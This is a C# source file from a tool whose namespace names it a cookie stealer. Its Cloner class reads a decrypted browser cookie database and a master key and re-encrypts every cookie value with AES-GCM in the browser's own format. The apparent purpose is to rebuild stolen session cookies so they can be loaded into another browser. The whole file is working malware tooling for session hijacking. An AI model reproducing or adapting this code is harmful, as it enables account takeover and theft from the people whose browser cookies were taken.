using System.Security.Cryptography;
using System.Text;
using Microsoft.Data.Sqlite;

namespace CookieStealer.Utilities;

public class Cloner
{
    private readonly string _workingDirectory = Path.GetFullPath("Clone");

    public Cloner()
    {
        Directory.CreateDirectory("Clone");
    }

    public void CloneDb()
    {
        Console.Write("Cloning cookies... ");
        var keyPath = Path.Combine(_workingDirectory, "master.key");
        var dbPath = Path.Combine(_workingDirectory, "Cookies_decrypted");
        File.Copy(dbPath, Path.Combine(_workingDirectory, "Cookies"), true);
        var clonedDbPath = Path.Combine(_workingDirectory, "Cookies");
        var key = File.ReadAllBytes(keyPath);

        using var connection = new SqliteConnection($"Data Source={clonedDbPath}");
        connection.Open();

        var command = connection.CreateCommand();
        command.CommandText =
            """
            SELECT *
            FROM cookies
            """;

        var countCommand = connection.CreateCommand();
        countCommand.CommandText =
            """
            SELECT COUNT(*)
            FROM cookies
            """;
        var totalRows = Convert.ToInt32(countCommand.ExecuteScalar());

        using (var progress = new ProgressBar())
        {
            using var reader = command.ExecuteReader();

            var i = 0;
            while (reader.Read())
            {
                var name = reader["name"].ToString();
                if (string.IsNullOrEmpty(name)) continue;

                var encryptedValue = (byte[])reader["encrypted_value"];
                var value = (string)reader["value"];
                var creationUtc = reader["creation_utc"].ToString();

                var newEncryptedValue = EncryptCookie(key, value, encryptedValue);

                using var updateCommand = connection.CreateCommand();
                updateCommand.CommandText =
                    """
                    UPDATE cookies
                    SET value = $value, encrypted_value = $encrypted_value
                    WHERE creation_utc = $creation_utc
                    """;
                updateCommand.Parameters.AddWithValue("$value", "");
                updateCommand.Parameters.AddWithValue("$encrypted_value", newEncryptedValue);
                updateCommand.Parameters.AddWithValue("$creation_utc", creationUtc);
                updateCommand.ExecuteNonQuery();

                i++;
                progress.Report((double)i / totalRows);
            }
        }

        Console.WriteLine("Done.");
    }

    private static byte[] EncryptCookie(byte[] masterKey, string decryptedCookie, byte[] encryptedCookie)
    {
        var plaintext = Encoding.UTF8.GetBytes(decryptedCookie);

        var versionTag = encryptedCookie[..3];
        var nonce = encryptedCookie[3..15];
        var ciphertext = new byte[plaintext.Length];
        var authTag = new byte[16];

        using var aesGcm = new AesGcm(masterKey);
        aesGcm.Encrypt(nonce, plaintext, ciphertext, authTag);

        var resultBytes = new byte[versionTag.Length + nonce.Length + ciphertext.Length + authTag.Length];

        Buffer.BlockCopy(versionTag, 0, resultBytes, 0, versionTag.Length);
        Buffer.BlockCopy(nonce, 0, resultBytes, versionTag.Length, nonce.Length);
        Buffer.BlockCopy(ciphertext, 0, resultBytes, versionTag.Length + nonce.Length, ciphertext.Length);
        Buffer.BlockCopy(authTag, 0, resultBytes, versionTag.Length + nonce.Length + ciphertext.Length, authTag.Length);

        return resultBytes;
    }
}